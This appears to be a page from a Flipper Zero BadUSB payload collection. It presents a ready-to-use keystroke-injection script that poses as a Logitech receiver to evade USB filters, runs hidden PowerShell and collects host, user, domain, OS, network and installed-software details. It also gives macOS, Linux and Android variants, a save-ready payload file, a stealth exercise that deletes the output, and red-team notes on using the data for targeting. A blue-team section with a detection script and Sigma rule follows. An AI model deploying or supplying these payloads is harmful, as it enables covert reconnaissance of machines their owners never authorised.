# FZ-I01: System Information Collector - Windows

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-I01 |
| **Name** | System Information Collector |
| **Difficulty** | Intermediate |
| **Target OS** | Windows 10/11 |
| **Execution Time** | ~10 seconds |
| **Output** | %TEMP%\sysinfo.txt |
| **MITRE ATT&CK** | T1082 (System Information Discovery) |

## What This Payload Does

Collects comprehensive system information including hostname, user, OS details, network configuration, and installed software. Saves to a hidden temp file.

---

## The Payload

```ducky
REM =============================================
REM INTERMEDIATE: System Info Collector
REM Target: Windows 10/11
REM Action: Gathers system info to temp file
REM Output: %TEMP%\sysinfo.txt
REM Skill: Intermediate
REM =============================================

ID 046d:c52b Logitech:Unifying Receiver

DELAY 2500

REM Open hidden PowerShell
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500

REM Build info collection script
STRINGLN $out = @()
STRINGLN $out += "=== SYSTEM INFORMATION ==="
STRINGLN $out += "Generated: $(Get-Date)"
STRINGLN $out += "Hostname: $env:COMPUTERNAME"
STRINGLN $out += "Username: $env:USERNAME"
STRINGLN $out += "Domain: $env:USERDOMAIN"
STRINGLN $out += ""
STRINGLN $out += "=== OPERATING SYSTEM ==="
STRINGLN $out += (Get-WmiObject Win32_OperatingSystem | Select Caption, Version, BuildNumber | Out-String)
STRINGLN $out += ""
STRINGLN $out += "=== NETWORK ADAPTERS ==="
STRINGLN $out += (Get-NetIPAddress -AddressFamily IPv4 | Select InterfaceAlias, IPAddress | Out-String)
STRINGLN $out += ""
STRINGLN $out += "=== INSTALLED SOFTWARE ==="
STRINGLN $out += (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion | Sort DisplayName | Out-String)
STRINGLN $out | Out-File "$env:TEMP\sysinfo.txt"
STRINGLN exit
```

---

## Line-by-Line Breakdown

### Header Section
```ducky
ID 046d:c52b Logitech:Unifying Receiver
```
**USB Device Spoofing**: Makes the Flipper appear as a Logitech keyboard. This can:
- Bypass simple USB device filters
- Look less suspicious in logs
- Match common office equipment

### Hidden PowerShell
```ducky
STRING powershell -w hidden
```
The `-w hidden` flag:
- Hides the PowerShell window completely
- User sees nothing on screen
- Still runs with full capabilities

### Array Building
```ducky
STRINGLN $out = @()
STRINGLN $out += "Line 1"
STRINGLN $out += "Line 2"
```
PowerShell arrays allow:
- Building data incrementally
- Adding formatted sections
- Single file write at end

### Information Commands

| Command | Information Gathered |
|---------|---------------------|
| `$env:COMPUTERNAME` | System hostname |
| `$env:USERNAME` | Current user |
| `$env:USERDOMAIN` | Domain/workgroup |
| `Get-WmiObject Win32_OperatingSystem` | OS name, version, build |
| `Get-NetIPAddress` | Network interfaces and IPs |
| `Get-ItemProperty HKLM:\...\Uninstall\*` | Installed software |

---

## What Gets Collected

```
=== SYSTEM INFORMATION ===
Generated: 12/28/2025 10:30:00 AM
Hostname: DESKTOP-ABC123
Username: john.doe
Domain: CONTOSO

=== OPERATING SYSTEM ===
Caption                Version    BuildNumber
-------                -------    -----------
Microsoft Windows 11   10.0.22631 22631

=== NETWORK ADAPTERS ===
InterfaceAlias  IPAddress
--------------  ---------
Wi-Fi           192.168.1.105
Ethernet        10.0.0.50

=== INSTALLED SOFTWARE ===
DisplayName              DisplayVersion
-----------              --------------
7-Zip                    22.01
Adobe Acrobat            23.001.20093
Google Chrome            120.0.6099.130
...
```

---

## Cross-Platform Versions

### macOS
```ducky
DELAY 2500
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500
STRINGLN {
STRINGLN echo "=== SYSTEM INFO ===" > /tmp/sysinfo.txt
STRINGLN echo "Hostname: $(hostname)" >> /tmp/sysinfo.txt
STRINGLN echo "User: $(whoami)" >> /tmp/sysinfo.txt
STRINGLN echo "OS: $(sw_vers)" >> /tmp/sysinfo.txt
STRINGLN echo "IP: $(ifconfig | grep 'inet ')" >> /tmp/sysinfo.txt
STRINGLN } 2>/dev/null
```

### Linux
```ducky
DELAY 2500
CTRL ALT t
DELAY 1000
STRINGLN {
STRINGLN echo "=== SYSTEM INFO ===" > /tmp/sysinfo.txt
STRINGLN echo "Hostname: $(hostname)" >> /tmp/sysinfo.txt
STRINGLN echo "User: $(whoami)" >> /tmp/sysinfo.txt
STRINGLN echo "Kernel: $(uname -a)" >> /tmp/sysinfo.txt
STRINGLN echo "IP: $(ip addr | grep 'inet ')" >> /tmp/sysinfo.txt
STRINGLN cat /etc/os-release >> /tmp/sysinfo.txt
STRINGLN } 2>/dev/null
```

### Android (via OTG)
```ducky
DELAY 3000
REM Android requires longer delays
GUI r
DELAY 500
REM Open terminal emulator if installed
STRING com.termux
ENTER
DELAY 2000
STRINGLN uname -a > /sdcard/sysinfo.txt
STRINGLN getprop >> /sdcard/sysinfo.txt
STRINGLN ip addr >> /sdcard/sysinfo.txt
```

---

## Red Team Perspective

### Why This Information Matters

| Data Point | Attack Value |
|------------|--------------|
| Hostname | Target identification |
| Username | Account targeting |
| Domain | Lateral movement scope |
| OS Version | Exploit selection |
| Network IPs | Network mapping |
| Software List | Vulnerability identification |

### Attack Chain Position
```
System Info → Vulnerability Research → Exploitation → Persistence
     ↑
 You are here
```

---

## Blue Team Perspective

### Detection Opportunities

1. **Hidden PowerShell**
   - Event ID 4688: powershell.exe with -w hidden
   - PowerShell logging: Script block events

2. **WMI Queries**
   - Unusual WMI activity in logs
   - Win32_OperatingSystem queries

3. **File Creation**
   - New .txt files in %TEMP%
   - Sysmon Event ID 11

### Detection Script
```powershell
# Check for recent hidden PowerShell
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    Id=4688
} | Where-Object {
    $_.Message -match 'powershell.*-w.*hidden'
} | Select TimeCreated, Message
```

### Sigma Rule
```yaml
title: Hidden PowerShell with System Enumeration
status: experimental
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        CommandLine|contains|all:
            - 'powershell'
            - '-w'
            - 'hidden'
    enumeration:
        CommandLine|contains:
            - 'Get-WmiObject'
            - 'Win32_OperatingSystem'
            - 'Get-NetIPAddress'
    condition: selection and enumeration
level: high
```

---

## Practice Exercises

### Exercise 1: Add More Info
Extend the script to also collect:
- Running processes
- Scheduled tasks
- Startup programs

### Exercise 2: Stealth Mode
Modify to delete the output file after 60 seconds:
```ducky
STRINGLN Start-Sleep 60; Remove-Item "$env:TEMP\sysinfo.txt"
```

### Exercise 3: Network Focus
Create a version focused only on network info:
- All IP addresses
- Active connections
- DNS cache
- ARP table

---

## Payload File

Save as `FZ-I01_System_Info_Collector.txt`:

```ducky
REM FZ-I01: System Info Collector
ID 046d:c52b Logitech:Unifying Receiver
DELAY 2500
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500
STRINGLN $o=@();$o+="Host: $env:COMPUTERNAME";$o+="User: $env:USERNAME";$o+="OS: "+(Get-WmiObject Win32_OperatingSystem).Caption;$o+="IPs: "+((Get-NetIPAddress -AddressFamily IPv4).IPAddress -join ", ");$o|Out-File "$env:TEMP\sysinfo.txt";exit
```

---

[← Intermediate Scripts](README.md) | [Next: FZ-I02 WiFi Password Extractor →](FZ-I02_WiFi_Password_Extractor.md)
